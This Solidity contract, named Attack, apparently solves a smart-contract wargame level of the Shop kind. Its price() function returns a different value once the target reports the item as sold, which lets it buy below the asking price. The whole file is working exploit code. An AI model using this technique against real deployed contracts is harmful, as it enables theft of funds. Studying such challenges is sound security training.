// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Attack {
    uint256 public initialPrice = 100; 
    IShop shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function price() public view returns (uint256) { 
        if (shop.isSold()) {
            return 0; 
        }
        return initialPrice; 
    }

    function buy() public {
        shop.buy();
    }
}